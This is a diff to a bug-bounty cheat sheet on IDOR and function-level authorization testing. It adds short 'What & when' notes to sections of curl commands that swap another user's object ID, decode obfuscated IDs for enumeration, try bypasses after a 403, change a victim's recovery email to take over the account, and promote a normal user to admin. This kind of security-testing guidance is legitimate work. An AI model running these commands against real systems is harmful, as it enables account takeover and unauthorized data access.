@@ -16,6 +16,7 @@ export BID=124                                   # an object/user id owned by B
 ```
 
 ## B. The core test — A's creds, B's object (guide §4)
+*What & when:* the one test the whole class reduces to — walk in as A, ask for B's object. Run it first on every reference. The three outcomes (B's data / 403-404 / your own data) tell you exactly whether to report, bypass, or move on.
 ```bash
 # 1) Baseline: A reads A's own object (works, 200, A's data)
 curl -s "$T/api/orders/7001" -H "$A" | jq .
@@ -39,6 +40,7 @@ Verify each "Bypassed!" by hand (guide §19) before reporting.
 ```
 
 ## D. Decode / mutate encoded IDs (guide §5.2/§6.2)
+*What & when:* whenever the ticket number *looks* random. Most "random" ids are a sequential number wearing a costume — base64, a hash, or a reversible obfuscator (Hashids/Sqids/Optimus) whose salt sits in the front-end JS. Decode it, and mass enumeration is back on the table.
 ```bash
 echo -n 'MTIz' | base64 -d            # → 123      (base64 id)
 echo -n 'user_123' | base64           # re-encode after incrementing
@@ -86,6 +88,7 @@ curl -s "$T/dashboard"     -H "Cookie: session=<A>; uid=$BID"
 ```
 
 ## H. The ID-mutation / bypass matrix (run when the swap returns 403/404) (guide §8)
+*What & when:* your response to a "no." The app usually guards one door and forgets the side doors — a different verb, the `.json` version, the old `/v1/`, a bracket-wrapped id, or a child id under your own parent. Fire the matrix before ever concluding "protected"; one row opens a large share of 403 endpoints.
 ```bash
 ID=$BID
 # 1) METHOD / VERB swap (GET guarded, others not)
@@ -144,6 +147,7 @@ curl -s -X PATCH "$T/api/orders/7001" -H "$A" -H 'Content-Type: application/merg
 ```
 
 ## J. Write IDOR → Account Takeover (guide §12)
+*What & when:* the escalation that turns a read into a paycheck — point a write at the victim's recovery email, reset, and log in as them. Always finish with the "verify as B" line; a 200 is not proof the change landed.
 ```bash
 # Change victim's recovery email (A's creds, B's id) → reset → own the account:
 curl -s -X PUT "$T/api/users/$BID/email" -H "$A" -H 'Content-Type: application/json' \
@@ -157,6 +161,7 @@ curl -s "$T/api/users/$BID" -H "$B" | jq '.email'
 ```
 
 ## K. BFLA — function-level (guide §10/§13) — usually Critical
+*What & when:* when the target is an *action*, not an object — replay an admin-only operation as your normal user A. The web UI hides the button but the API often skips the rank check. Self-promote, create an admin, or impersonate; almost always Critical. Use your own objects for anything destructive.
 ```bash
 curl -s -X POST  "$T/api/admin/users"           -H "$A" -d '{"email":"a@a.t","role":"admin"}'
 curl -s -X PATCH "$T/api/users/me"              -H "$A" -d '{"role":"admin"}'
